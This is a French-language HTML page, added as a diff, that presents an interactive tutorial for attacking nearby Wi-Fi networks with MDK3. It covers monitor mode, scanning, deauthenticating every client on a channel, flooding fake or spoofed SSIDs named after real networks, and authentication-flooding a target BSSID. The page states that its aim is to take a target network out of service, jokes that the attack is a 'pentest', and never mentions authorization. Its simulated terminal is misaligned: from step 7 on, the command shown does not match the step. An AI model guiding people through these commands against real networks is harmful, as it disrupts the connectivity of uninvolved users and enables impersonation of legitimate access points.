@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MDK3 WIFI</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #2c3e50;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #1c7bc1;
+            padding: 20px;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 36px;
+        }
+        .container {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+        }
+        .tutorial-section {
+            background-color: #34495e;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            display: none;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .tutorial-section.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        .tutorial-section h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .terminal {
+            background-color: #333;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: "Courier New", monospace;
+            color: #00ff00;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin-top: 20px;
+            font-size: 16px;
+            max-height: 300px;
+            overflow-y: auto;
+            line-height: 1.6;
+            border: 2px solid #1c7bc1;
+        }
+        .tutorial-btn {
+            background-color: #1c7bc1;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+        }
+        .tutorial-btn:hover {
+            background-color: #16a085;
+        }
+        .navigation-btns {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .tutorial-btn:disabled {
+            background-color: #7f8c8d;
+            cursor: not-allowed;
+        }
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>MDK3 WIFI</h1>
+</header>
+<p>Vous allez apprendre à perturber les réseaux Wi-Fi et évebtuellement rendre hors service un réseau cible. On utilisera MDK3 pour effectuer une attaque par déni de service distribué (DDOS) sur des réseaux Wi-Fi. Les sorties fictives du faux terminal ne correspondent pas aux vrais sorties, elles sont simplifiées</p>
+
+<div class="container">
+    <section class="tutorial-section active" id="section-1">
+        <h2>1. Accès Super Utilisateur (root)</h2>
+        <p>Si tu viens de Windows,MacOs,Android ou encore IOSc'est que tu n'as probablement jamais eu la sensation d'être maître de ton appareil ! Interagir avec les composant de ton ordinateur nécessite que tu es leur autorisation : et oui le consentement ! Ici Aircrack-NG a besoin de permissions pour fonctionner notamment pour manipuler la carte réseau. Donc, on commence par une commande qui lui donne ces droits, un peu comme un badge d'accès à un batiment ou des clés de voiture pour la démarrer. Sur les distributions linux,tu'utilises la <code>sudo su</code> pour obtenir les droits de super utilisateur (root).</p>
+        <div class="terminal" id="terminal-output-1"></div>
+        <button class="tutorial-btn" onclick="runCommand(1)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(2)">Suivant</button>
+        </div>
+    </section>
+    <section class="tutorial-section" id="section-2">
+        <h2>2. Vérification de la configuration réseau (iwconfig)</h2>
+        <p>La commande <code>iwconfig</code> affiche les informations réseau de l'interface sans fil (SSID, mode, etc.). Tu pourras alors noter le nom de ton interface, tu peux aussi utiliser <code>ifconfig</code></p>
+        <div class="terminal" id="terminal-output-2"></div>
+        <button class="tutorial-btn" onclick="runCommand(2)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(1)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(3)">Suivant</button>
+        </div>
+    </section>
+    <section class="tutorial-section" id="section-3">
+        <h2>3. Activer Mode Moniteur (airmon-ng start wlan0)</h2>
+        <p>En temps normal ta carte wifi écoute grossièrement que les données qu'elle recoit du réseau auquel est connecter ton appareil.Ce qu'on veut nous pour analyser le trafic réseau autour de toi c'est écouter tout les réseaux disponibles à proximité,donc on met la carte réseau en mode moniteur!C'est comme papi à l'EPHAD qui respire h24 en bouteille d'oxygène et puis POUF il redecouvre l'air environnant ainsi que toutes les odeurs de ses compagnons de vie!</p>
+        <div class="terminal" id="terminal-output-3"></div>
+        <button class="tutorial-btn" onclick="runCommand(3)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(2)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(4)">Suivant</button>
+        </div>
+    </section>
+    <section class="tutorial-section" id="section-4">
+        <h2>4. Scan des Réseaux (airodump-ng wlan0mon)</h2>
+        <p>Puis ensuite on veut connaître les réseaux wifi à proximité et leur scaractéristiques. Grace à un scan on obtient une liste de tous les réseaux dans la zone en temps réél,tu pourras connaître son blaze ou encore si il est lent par exemple:pratique si tu veux mener une attaque^que dis-je un pentest biensûr^!</p>
+        <div class="terminal" id="terminal-output-4"></div>
+        <button class="tutorial-btn" onclick="runCommand(4)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(3)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(5)">Suivant</button>
+        </div>
+    </section>
+    <section class="tutorial-section" id="section-5">
+        <h2>5. Désauthentification des Appareils sur un Canal choisi (mdk3 wlan0mon d -c 6)</h2>
+        <p>on peut désauthentifier un utilisateur du réseau cible pour que sa machine soit forcé de se reconnecter au réseau automatiquement et envoyer des paquets de données, ce que font les machine pour s'authentifier au près d'un réseau ! La commande <code>mdk3 wlan0mon d -c 6</code> envoie des paquets de déconnexion sur le canal 6, coupant la connexion des clients de tous les réseaux sur ce canal spécifique (Chaque réseau wifi a son canal). On peut aussi ne pas spécifier de canal, auquel cas ce sera appliquer sur tous les réseaux de tous les canaux.</p>
+        <div class="terminal" id="terminal-output-5"></div>
+        <button class="tutorial-btn" onclick="runCommand(5)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(4)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(6)">Suivant</button>
+        </div>
+    </section>
+
+    <section class="tutorial-section" id="section-6">
+        <h2>6. Innondation de faux Réseaux WIFI (mdk3 wlan0mon b)</h2>
+        <p>On créé une inondation de faux SSID (defaux wifi, tu pourras d'ailleurs le remarquer en regardant les wifi dispo sur un téléphone), ça déroute les utilisateurs ce qui rend difficile l'identification du véritable réseau car on va pouvoir nommer nos faux réseaux comme un déjà existant. On peut ajouter <code>-c 'nombre'</code> pour spécifier le canal qu'aura nos réseaux.</p>
+        <div class="terminal" id="terminal-output-6"></div>
+        <button class="tutorial-btn" onclick="runCommand(6)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(5)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(7)">Suivant</button>
+        </div>
+    </section>
+
+    <section class="tutorial-section" id="section-7">
+        <h2>7. Création Fichier Liste des réseaux fake (nano liste_ssid.txt)</h2>
+        <p>On peut créer des faux réseaux nommés comme on le veut comme un vrai déjà existant par exemple. Alors la commande <code>nano liste_ssid.txt</code> va ouvrir l'éditeur de texte nano du terminal et on pourra ajouter des noms à la ligne. Cela nous permet de falsifier.</p>
+        <div class="terminal" id="terminal-output-7"></div>
+        <button class="tutorial-btn" onclick="runCommand(7)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(6)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(8)">Suivant</button>
+        </div>
+    </section>
+
+    <section class="tutorial-section" id="section-8">
+        <h2>8. Diffusion des Faux SSID nommés sur canal choisi (mdk3 wlan0mon b -c 1 -f liste_ssid.txt)</h2>
+        <p>La commande <code>mdk3 wlan0mon b -c 1 -f liste_ssid.txt</code> permet de diffuser les SSID fictifs enregistrés dans le fichier liste_ssid.txt. On pourra chosir le meme canal que les réseau à falsifier ou ne pas en chosir du tout, ici canal 1.</p>
+        <div class="terminal" id="terminal-output-8"></div>
+        <button class="tutorial-btn" onclick="runCommand(8)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(7)">Précédent</button>
+            <button class="tutorial-btn" onclick="showSection(9)">Suivant</button>
+        </div>
+    </section>
+
+    <section class="tutorial-section" id="section-9">
+        <h2>9. Inondation authentification (mdk3 wlan0mon a -a &lt;BSSID&gt;)</h2>
+        <p>La commande <code>mdk3 wlan0mon a -a &lt;BSSID&gt;</code> va nous permettre d'inonder d'authentification au réseau fake, c'est le contraire de la désauthtification. Le BSSID est choisi à partir des réseaux cible disponible, vu lors du scan avec airodump, et nous permetra de surchager le réseau et de potentiellement le rendre hors service.</p>
+        <div class="terminal" id="terminal-output-9"></div>
+        <button class="tutorial-btn" onclick="runCommand(9)">Exécuter</button>
+        <div class="navigation-btns">
+            <button class="tutorial-btn" onclick="showSection(8)">Précédent</button>
+        </div>
+    </section>
+</div>
+
+<script>
+    const typingSpeed = 50;
+    const dynamicInterval = 1500;
+
+    const commands = [
+        { command: "$ sudo su", output: "\nMot de passe:\nMode root activé", isDynamic: false },
+        { command: "$ iwconfig", output: "\nwlan0     IEEE 802.11  ESSID:off/any\n          Mode:Managed  Frequency:2.437 GHz  Access Point: Wifi_poubelle_zig", isDynamic: false },
+        { command: "$ airmon-ng start wlan0", output: "\nmode moniteur activé sur wlan0", isDynamic: false },
+        { command: " airodump-ng wlan0mon", output: [
+            "\n\nSSID: Patate-WIFI    BSSID: 00:11:22:33:44:55\n Clients: 10",
+            "\n\nSSID: network-88-etude    BSSID: E8:55:34:12:46:35\n Clients: 4 \n\nSSID: Camille DUPOND    BSSID: 32:45:42:63:46:27\n Clients: 12 \n\nSSID: TVnetwork    BSSID: E6:32:67:33:67:00\n Clients: 7 ",
+            "\n\nSSID: livebox4    BSSID: 00:11:22:33:44:55\n Clients: 2",
+            "\n\nSSID: sfr32    BSSID: E8:55:34:12:46:35\n Clients: 3\n\nSSID: Gareporte    BSSID: 32:45:42:63:46:27\n Clients: 12 \n\nSSID: accueille_co    BSSID: E6:32:67:33:67:00\n Clients: 7 ",
+            "\n\nSSID: freewifi    BSSID: E8:55:34:12:46:35\n Clients: 1",
+
+        ], isDynamic: true },
+        { command: "$ mdk3 wlan0mon d -c 6", output: "\nPackets de désauthentification envoyés aux clients sur des réseaux utilisant le canal 6", isDynamic: false },
+        { command: "$ mdk3 wlan0mon b", output: "\nInondation de faux réseaux aléatoires", isDynamic: false },
+        { command: "$ mdk3 wlan0mon b -c 1", output: "\nInondation de faux réseaux aléatoires sur le canal 1", isDynamic: false },
+        { command: "$ nano liste_ssid.txt", output: "\nÉditeur nano: liste des SSID", isDynamic: false },
+        { command: "$ mdk3 wlan0mon b -c 1 -f liste_ssid.txt", output: "\nInnondation de faux SSID nommés depuis liste_ssid.txt", isDynamic: false },
+        { command: "$ mdk3 wlan0mon a -a <BSSID>", output: "\nForcer authentification en cours au BSSID cible...", isDynamic: false }
+    ];
+
+    function typeCommand(index) {
+        const terminalElement = document.getElementById(`terminal-output-${index}`);
+        const commandObj = commands[index - 1];
+        let commandPos = 0;
+
+        function type() {
+            if (commandPos < commandObj.command.length) {
+                terminalElement.innerHTML += commandObj.command.charAt(commandPos);
+                commandPos++;
+                setTimeout(type, typingSpeed);
+            } else {
+                displayOutput(index);
+            }
+        }
+        type();
+    }
+
+    function displayOutput(index) {
+        const terminalElement = document.getElementById(`terminal-output-${index}`);
+        const commandObj = commands[index - 1];
+
+        if (commandObj.isDynamic) {
+            let outputIndex = 0;
+            setInterval(() => {
+                terminalElement.innerHTML = `$ ${commandObj.command}\n` + commandObj.output[outputIndex];
+                outputIndex = (outputIndex + 1) % commandObj.output.length;
+                terminalElement.scrollTop = terminalElement.scrollHeight;
+            }, dynamicInterval);
+        } else {
+            terminalElement.innerHTML += commandObj.output;
+        }
+    }
+
+    function runCommand(index) {
+        const terminalElement = document.getElementById(`terminal-output-${index}`);
+        terminalElement.innerHTML = ""; 
+        typeCommand(index);
+    }
+
+    function showSection(sectionIndex) {
+        document.querySelectorAll('.tutorial-section').forEach(section => section.classList.remove('active'));
+        document.getElementById(`section-${sectionIndex}`).classList.add('active');
+    }
+</script>
+
+</body>
+</html>
